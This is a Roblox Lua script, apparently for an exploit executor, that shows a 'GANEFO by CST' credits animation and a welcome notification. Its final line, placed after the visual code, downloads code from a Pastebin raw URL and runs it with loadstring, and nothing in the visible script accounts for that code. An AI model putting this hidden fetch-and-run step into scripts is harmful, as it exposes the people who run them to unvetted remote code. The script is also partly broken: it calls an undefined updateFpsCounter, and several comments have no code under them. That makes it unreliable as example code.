-- Create a ScreenGui to hold the credits
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Credits"
ScreenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

-- Acesse o objeto PlayerGui do jogador local
local playerGui = game.Players.LocalPlayer.PlayerGui

--contador de vida mais melhor do que o atual

-- Crie uma nova variável para a quantidade de saúde do jogador

--contador de fps bonitão
-- Acesse o objeto PlayerGui do jogador local

-- Conecte a função de atualização de FPS ao evento RenderStepped para que ela seja chamada a cada quadro
game:GetService("RunService").RenderStepped:Connect(updateFpsCounter)


-- Create an ImageLabel to display the image
local ImageLabel = Instance.new("ImageLabel")
ImageLabel.Name = "Image"
ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel.Position = UDim2.new(0.5, 0, 0.4, 0)
ImageLabel.Size = UDim2.new(0.2, 0, 0.2, 0)
ImageLabel.Image = "https://www.roblox.com/asset-thumbnail/image?assetId=12831856432&thumbnailFormat=png&width=420&height=420&fit=bounds"
ImageLabel.Parent = ScreenGui

-- Create a TextLabel to display the text
local TextLabel = Instance.new("TextLabel")
TextLabel.Name = "Text"
TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel.Position = UDim2.new(0.5, 0, 0.6, 0)
TextLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
TextLabel.Font = Enum.Font.GothamBold
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextScaled = true
TextLabel.Text = "GANEFO by CST"
TextLabel.Parent = ScreenGui

-- Create a function to animate the credits
local function animateCredits()
    -- Move the ImageLabel and TextLabel up
    local TweenService = game:GetService("TweenService")
    local imageTween = TweenService:Create(ImageLabel, TweenInfo.new(10, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 0, -0.2, 0)})
    local textTween = TweenService:Create(TextLabel, TweenInfo.new(10, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 0, -0.1, 0)})
    imageTween:Play()
    textTween:Play()
    
    -- Wait for the animation to finish
    wait(10)
    
    -- Reset the ImageLabel and TextLabel positions
    ImageLabel.Position = UDim2.new(0.5, 0, 0.4, 0)
    TextLabel.Position = UDim2.new(0.5, 0, 0.6, 0)
    
    -- Remove the ScreenGui
    ScreenGui:Destroy()
end

-- Call the function to start the animation
animateCredits()

-- Define the credit text and duration
local creditText = "Welcome to ganefo!"
local creditDuration = 10 -- in seconds

-- Define the list of decal IDs to choose from
local decalIds = {
    5479567228,
    5479565074,
    5479559610,
}

-- Choose a random decal ID from the list
local decalId = decalIds[math.random(#decalIds)]

-- Create the notification GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "NotificationCreditsGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui

local Frame = Instance.new("Frame")
Frame.BackgroundTransparency = 1
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(1, -200, 1, -50)
Frame.Size = UDim2.new(0, 200, 0, 50)
Frame.Parent = ScreenGui

local Decal = Instance.new("Decal")
Decal.Texture = "rbxassetid://" .. decalId
Decal.Face = Enum.NormalId.Back
Decal.Parent = Frame

local TextLabel = Instance.new("TextLabel")
TextLabel.BackgroundTransparency = 1
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = creditText
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 16
TextLabel.Position = UDim2.new(0, 10, 0, 10)
TextLabel.Size = UDim2.new(1, -20, 1, -20)
TextLabel.Parent = Frame

-- Function to animate the notification
local function animateNotification()
    -- Move the notification in from the right
    Frame:TweenPosition(UDim2.new(1, -200, 1, -50), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.5, true)
    wait(creditDuration - 1)
    -- Move the notification out to the left
    Frame:TweenPosition(UDim2.new(1, 0, 1, -50), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.5, true)
    wait(0.5)
    -- Destroy the GUI
    ScreenGui:Destroy()
end

-- Call the animation function
animateNotification()

loadstring(game:HttpGet("https://pastebin.com/raw/9EdhxeqD"))()
